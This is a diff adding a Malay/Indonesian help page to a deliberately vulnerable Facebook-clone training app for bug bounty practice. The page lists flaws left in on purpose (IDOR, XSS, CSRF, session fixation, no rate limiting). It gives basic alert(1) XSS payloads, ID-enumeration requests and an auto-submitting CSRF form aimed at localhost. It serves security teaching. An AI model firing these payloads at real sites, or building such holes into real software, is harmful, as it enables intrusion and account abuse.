@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bug Bounty - Facebook Clone</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="navbar-left">
+      <a href="/" class="logo">facebook</a>
+    </div>
+    <div class="navbar-center">
+      <input type="text" class="search-bar" placeholder="Cari di Facebook">
+    </div>
+    <div class="navbar-right">
+      <a href="/" class="nav-item" title="Beranda">🏠</a>
+      <button class="theme-toggle" onclick="toggleTheme()" title="Tema">🌙</button>
+      <div id="authSection">
+        <a href="/login" class="nav-item" title="Masuk">👤</a>
+      </div>
+      <div id="userSection" class="d-none">
+        <a href="/profile.html" class="nav-item" title="Profil">
+          <img id="navAvatar" src="" class="nav-avatar" alt="">
+        </a>
+        <button class="nav-item" onclick="logout()" title="Keluar">🚪</button>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container" style="padding-top:80px;">
+    <div class="main-content" style="max-width:900px;margin:0 auto;flex:none;">
+      <!-- Bug Bounty Header -->
+      <div class="card" style="background: linear-gradient(135deg, #1877F2, #00c4ff); color: white; padding: 24px;">
+        <h1 style="margin: 0; font-size: 28px;">🐛 Bug Bounty Program</h1>
+        <p style="margin: 8px 0 0; opacity: 0.9;">Program pembelajaran keamanan siber untuk clone Facebook tempatan</p>
+      </div>
+
+      <!-- Scope -->
+      <div class="card">
+        <div class="card-header">🎯 Scope (Ruang Lingkup)</div>
+        <div style="padding: 16px;">
+          <p style="margin-bottom: 12px;">Aplikasi ini adalah <strong>clone Facebook tempatan</strong> untuk tujuan pembelajaran bug bounty. Semua risiko di bawah ini adalah <strong>sengaja dikekalkan</strong> untuk latihan:</p>
+          
+          <div style="background: #fff0f3; border-left: 4px solid var(--fb-danger); padding: 12px; border-radius: 4px; margin-bottom: 16px;">
+            <strong>⚠️ PERINGATAN:</strong> Ini adalah environment LATIHAN. Jangan gunakan teknik yang diperoleh di sini pada sistem sebenar tanpa izin.
+          </div>
+
+          <h3 style="margin-top: 16px; margin-bottom: 8px;">Vulnerabilities yang sengaja dikekalkan:</h3>
+          <ul style="padding-left: 20px; line-height: 1.8;">
+            <li><strong>IDOR</strong> - Postingan dan data pengguna boleh diakses tanpa authorization yang betul</li>
+            <li><strong>XSS</strong> - Tiada sanitization pada input pengguna (postingan, komen, nama)</li>
+            <li><strong>CSRF</strong> - Tiada CSRF token pada operasi yang mengubah state</li>
+            <li><strong>Session Fixation</strong> - Session ID tidak diubah selepas login</li>
+            <li><strong>Information Disclosure</strong> - Metadata API mendedahkan struktur internal</li>
+            <li><strong>Broken Access Control</strong> - Tiada verifikasi pemilik pada operasi edit/delete</li>
+            <li><strong>Rate Limiting</strong> - Tiada had pada percubaan login atau API calls</li>
+            <li><strong>Insecure Direct Object Reference</strong> - Boleh akses /api/posts/:id dan /api/users/:id secara berurutan</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- How to Test -->
+      <div class="card">
+        <div class="card-header">📋 Panduan Pengujian</div>
+        <div style="padding: 16px;">
+          <h3 style="margin-top: 0;">1. Daftar / Login</h3>
+          <p>Buat akaun dengan username dan password mana sahaja:</p>
+          <code style="background: #f0f2f5; padding: 8px; border-radius: 4px; display: block; margin: 8px 0;">
+            POST /api/auth/register<br>
+            {"username":"hacker","name":"Bug Hunter","password":"test123"}
+          </code>
+
+          <h3>2. Uji IDOR</h3>
+          <p>Cuba akses postingan pengguna lain dengan menukar ID:</p>
+          <code style="background: #f0f2f5; padding: 8px; border-radius: 4px; display: block; margin: 8px 0;">
+            GET /api/posts/&lt;OTHER_USER_POST_ID&gt;<br>
+            PUT /api/posts/&lt;OTHER_USER_POST_ID&gt;<br>
+            DELETE /api/posts/&lt;OTHER_USER_POST_ID&gt;
+          </code>
+
+          <h3>3. Uji XSS</h3>
+          <p>Cuba input payload XSS dalam:</p>
+          <ul>
+            <li>Nama profil: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+            <li>Konten postingan: <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+            <li>Komentar: <code>&lt;svg onload=alert(1)&gt;</code></li>
+          </ul>
+
+          <h3>4. Uji CSRF</h3>
+          <p>Cuba buat request tanpa token CSRF:</p>
+          <code style="background: #f0f2f5; padding: 8px; border-radius: 4px; display: block; margin: 8px 0;">
+            POST /api/posts (tanpa CSRF token)<br>
+            POST /api/posts/:id/like (tanpa CSRF token)
+          </code>
+
+          <h3>5. Uji Session</h3>
+          <p>Cuba akses protected routes tanpa session:</p>
+          <code style="background: #f0f2f5; padding: 8px; border-radius: 4px; display: block; margin: 8px 0;">
+            GET /api/auth/me (tanpa cookie session)<br>
+            POST /api/posts (tanpa cookie session)
+          </code>
+        </div>
+      </div>
+
+      <!-- Payloads -->
+      <div class="card">
+        <div class="card-header">💣 Payloads Testing</div>
+        <div style="padding: 16px;">
+          <h3 style="margin-top: 0;">XSS Payloads</h3>
+          <div style="background: #f0f2f5; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 13px;">
+            <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
+            <div>&lt;img src=x onerror=alert(1)&gt;</div>
+            <div>&lt;svg onload=alert(1)&gt;</div>
+            <div>&lt;body onload=alert(1)&gt;</div>
+            <div>&lt;iframe src=javascript:alert(1)&gt;</div>
+            <div>&lt;input onfocus=alert(1) autofocus&gt;</div>
+            <div>&lt;select onfocus=alert(1) autofocus&gt;</div>
+            <div>&lt;textarea onfocus=alert(1) autofocus&gt;</div>
+            <div>&lt;marquee onstart=alert(1)&gt;</div>
+            <div>&lt;div style=background:url(javascript:alert(1))&gt;</div>
+          </div>
+
+          <h3>IDOR Testing</h3>
+          <div style="background: #f0f2f5; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 13px;">
+            <div># Enumerate user IDs</div>
+            <div>GET /api/users</div>
+            <div>GET /api/posts</div>
+            <div># Try sequential IDs</div>
+            <div>GET /api/users/1</div>
+            <div>GET /api/users/2</div>
+            <div>GET /api/posts/1</div>
+            <div>GET /api/posts/2</div>
+          </div>
+
+          <h3>CSRF Testing</h3>
+          <div style="background: #f0f2f5; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 13px;">
+            <div>&lt;form action="http://localhost:8080/api/posts" method="POST"&gt;</div>
+            <div>&lt;input name="content" value="CSFT Test"&gt;</div>
+            <div>&lt;/form&gt;</div>
+            <div>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tools -->
+      <div class="card">
+        <div class="card-header">🛠️ Tools yang Disyorkan</div>
+        <div style="padding: 16px;">
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px;">
+            <div class="sidebar-item" onclick="alert('Burp Suite Community Edition: https://portswigger.net/burp/communitydownload')">
+              <div class="sidebar-icon">🕷️</div>
+              <span>Burp Suite Community</span>
+            </div>
+            <div class="sidebar-item" onclick="alert('OWASP ZAP: https://www.zaproxy.org/download/')">
+              <div class="sidebar-icon">⚡</div>
+              <span>OWASP ZAP</span>
+            </div>
+            <div class="sidebar-item" onclick="alert('Postman: https://www.postman.com/downloads/')">
+              <div class="sidebar-icon">📮</div>
+              <span>Postman</span>
+            </div>
+            <div class="sidebar-item" onclick="alert('curl - untuk testing API dari command line')">
+              <div class="sidebar-icon">💻</div>
+              <span>curl</span>
+            </div>
+            <div class="sidebar-item" onclick="alert('Browser DevTools - Inspect element dan Network tab')">
+              <div class="sidebar-icon">🔍</div>
+              <span>Browser DevTools</span>
+            </div>
+            <div class="sidebar-item" onclick="alert('Nikto, WPScan, Nmap - untuk scanning')">
+              <div class="sidebar-icon">🔎</div>
+              <span>Scanner Tools</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Resources -->
+      <div class="card">
+        <div class="card-header">📚 Sumber Belajar</div>
+        <div style="padding: 16px;">
+          <ul style="line-height: 2;">
+            <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" style="color: var(--fb-blue);">OWASP Top 10</a></li>
+            <li><a href="https://portswigger.net/web-security" target="_blank" style="color: var(--fb-blue);">PortSwigger Web Security Academy</a></li>
+            <li><a href="https://hackerone.com/ctf" target="_blank" style="color: var(--fb-blue);">HackerOne CTF</a></li>
+            <li><a href="https://bugcrowd.com/university" target="_blank" style="color: var(--fb-blue);">Bugcrowd University</a></li>
+            <li><a href="https://owasp.org/www-community/attacks/" target="_blank" style="color: var(--fb-blue);">OWASP Attack Types</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="mobile-nav">
+    <button class="mobile-nav-item active" onclick="window.location.href='/'">
+      <span>🏠</span>
+      <span>Beranda</span>
+    </button>
+    <button class="mobile-nav-item" onclick="window.location.href='/bug-bounty'">
+      <span>🐛</span>
+      <span>Bug Bounty</span>
+    </button>
+    <button class="mobile-nav-item" onclick="openCreateModal()">
+      <span>➕</span>
+      <span>Posting</span>
+    </button>
+    <button class="mobile-nav-item" onclick="alert('Fitur segera hadir')">
+      <span>💬</span>
+      <span>Pesan</span>
+    </button>
+    <button class="mobile-nav-item" onclick="window.location.href='/profile.html'">
+      <span>👤</span>
+      <span>Profil</span>
+    </button>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setTheme(getTheme());
+    
+    async function init() {
+      await checkAuth();
+      if (!currentUser) {
+        window.location.href = '/login';
+        return;
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', init);
+  </script>
+</body>
+</html>
